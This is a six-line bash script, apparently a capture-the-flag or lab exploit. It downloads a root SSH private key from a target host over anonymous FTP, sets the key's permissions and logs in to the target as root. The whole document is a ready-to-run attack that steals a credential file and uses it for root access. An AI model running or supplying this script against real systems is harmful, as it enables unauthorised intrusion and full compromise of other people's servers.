#!/bin/bash
# Grabs root SSH key via anonymous FTP and logs in.

wget "ftp://$1/sbc/aff/id_rsa"
chmod 600 id_rsa
ssh -i id_rsa root@$1
